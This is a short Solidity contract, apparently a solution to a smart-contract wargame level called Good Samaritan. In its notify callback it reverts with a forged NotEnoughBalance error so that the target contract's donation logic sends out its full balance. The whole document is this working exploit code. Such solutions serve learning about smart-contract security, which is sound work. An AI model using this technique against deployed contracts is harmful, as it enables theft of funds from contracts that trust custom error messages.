contract GoodSamaritanAttack {
    error NotEnoughBalance();
     
    function attack(address goodSamaritan) external  {
        GoodSamaritan(goodSamaritan).requestDonation();
    }
   

    function notify(uint256 amount) external  {
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }
}
